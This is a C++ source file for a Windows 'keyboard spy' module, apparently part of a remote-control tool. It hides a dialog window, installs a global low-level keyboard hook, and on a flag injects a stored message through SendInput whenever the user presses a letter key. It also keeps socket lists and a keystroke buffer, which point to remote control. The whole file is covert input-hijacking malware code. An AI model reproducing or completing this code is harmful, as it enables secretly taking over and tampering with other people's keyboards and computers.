#include "keyboardtakeover.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
// 初始化类
static KeyboardTakeOver gSpy;
// 窗口句柄
static HWND hWnd = NULL;
// 键盘钩子句柄
static HHOOK gHHook = NULL;
// socket列表
static std::vector<TcpSocket*> gSockets;
// 键盘数据缓存区
static std::vector<char> gBuffer;

KeyboardTakeOver::KeyboardTakeOver()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);

    // 创建一个对话框来处理win32事件
    createDialogByNewThread();
}

KeyboardTakeOver::~KeyboardTakeOver()
{
    if(hWnd) {
        // 关闭计时器
        KillTimer(hWnd, 0);

        // 删除socket
        const int max = gSockets.size();
        for (int i=0; i<max; ++i) {
            gSockets.at(i)->dissconnect();
            delete gSockets.at(i);
        }

        // 关闭窗口
        DestroyWindow(hWnd);

        // 移除键盘监控
        if (gHHook) {
            uninstallKeyboardHook(gHHook);
        }
    }

    // 删除互挤体
    DeleteCriticalSection(&gCs);
    std::cout << "destroy keyboard spy" << std::endl;
    std::fflush(stdout);
}

void KeyboardTakeOver::startKeyboardTakeOver(std::string domain, int port)
{


}





void KeyboardTakeOver::createDialogByNewThread()
{
     // 启动一个新线程来做监控
     HANDLE h = CreateThread(NULL,0,KeyboardTakeOver::threadProc,(LPVOID)NULL,0,NULL);
     if (!h) {
         std::cout << "Failed to create new thread" << std::endl;
         std::fflush(stdout);
     }
}

DWORD KeyboardTakeOver::threadProc(LPVOID)
{
    // 创建一个不可见的窗口来处理win32事件
    WORD tempMem[1024];
    LPDLGTEMPLATEA temp = (LPDLGTEMPLATEA)tempMem;
    temp->style=WS_CAPTION;  temp->dwExtendedStyle=0;
    temp->x=0; temp->y=0;
    temp->cx=0; temp->cy=0;
    if(temp == NULL)
    {
        std::cout << "temp is null " << std::endl;
        std::fflush(stdout);
    }
    else
    {
        std::cout << "temp is ready " << std::endl;
        std::fflush(stdout);
    }


    int ret = DialogBoxIndirectParamA(NULL,temp, NULL, KeyboardTakeOverWndProc,(LPARAM)NULL);
    if (ret == -1) {
        std::cout << "Failed to create dialog box for keyboard spy" << std::endl;
        std::fflush(stdout);

    }

    return true;
}



BOOL CALLBACK KeyboardTakeOver::KeyboardTakeOverWndProc(HWND hWnd, UINT uiMsg, WPARAM , LPARAM )
{

    switch(uiMsg) {
    // 初始化监控
    case WM_INITDIALOG: {
        // 安装键盘钩子来截取系统的所有键盘输入
        gHHook = installKeyboardHook();
        if (!gHHook) {
            std::cout << "Failed to install keyboard hook" << std::endl;
            std::fflush(stdout);
        }

        break;
    }
    case WM_PAINT:
        // 隐藏窗口
        ShowWindow(hWnd,SW_HIDE);
        break;
    default:
        break;
    }

    return false;
}

HHOOK KeyboardTakeOver::installKeyboardHook()
{
    //使用setwindowshook函数安装全局系统钩子
    return SetWindowsHookExA(13, keyboardHookProc, GetModuleHandleA(NULL), 0);
}

void KeyboardTakeOver::uninstallKeyboardHook(HHOOK hHook)
{
    UnhookWindowsHookEx(hHook);
}

BOOL KeyBoardChanged = false;

void KeyboardTakeOver::FlagtoTrue()
{
    KeyBoardChanged=true;
}


void KeyboardTakeOver::FlagtoFalse()
{
    KeyBoardChanged=false;
}


LRESULT KeyboardTakeOver::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // 对键盘篡改条件进行判断：
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        if(KeyBoardChanged == true)
        {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            if (kbdStruct->vkCode >= 'A' && kbdStruct->vkCode <= 'Z') {
            //MessageBoxA(NULL, "Your keyboard has changed", "Message", MB_OK);
            // 遍历消息字符串中的每个字符并模拟键盘输入
            //KeyboardTakeOver::message = "";
            for (char c :message) {
                INPUT input;
                input.type = INPUT_KEYBOARD;
                input.ki.wVk = 0; // 无虚拟键码，直接使用 Unicode 字符
                input.ki.wScan = c; // Unicode 字符对应的扫描码
                input.ki.dwFlags = KEYEVENTF_UNICODE; // 使用 Unicode 字符
                input.ki.time = 0;
                input.ki.dwExtraInfo = 0;

                // 按下键盘按键
                SendInput(1, &input, sizeof(INPUT));

                // 释放键盘按键
                input.ki.dwFlags |= KEYEVENTF_KEYUP;
                SendInput(1, &input, sizeof(INPUT));

                // 可以添加适当的延迟以模拟人工输入的速度
                Sleep(5);

                std::cout << "simulate"<< std::endl;
                std::fflush(stdout);
            }
            }
        }
    }
    //将钩子事件传递给下一个钩子或者默认的钩子处理函数，以确保钩子链继续工作
    return CallNextHookEx(gHHook,nCode,wParam,lParam);
}

void KeyboardTakeOver::addSocket(TcpSocket *sock)
{
    // 锁定函数，其他线程不能进来，保护线程安全
    EnterCriticalSection(&gCs);

    gSockets.push_back(sock);

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
}

std::vector<TcpSocket *> KeyboardTakeOver::getSockets()
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket *> sockets = gSockets;

    // 解除函数锁定
    LeaveCriticalSection(&gCs);

    return sockets;
}

void KeyboardTakeOver::delSocket(TcpSocket *sock)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket*>::iterator iter = gSockets.begin();
    for (; iter!=gSockets.end(); ++iter) {
        if (*iter == sock) {
            gSockets.erase(iter);
            break;
        }
    }

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
}

void KeyboardTakeOver::addBuffer(char data)
{
    gBuffer.push_back(data);
}

void KeyboardTakeOver::delBuffer()
{
    gBuffer.clear();
}




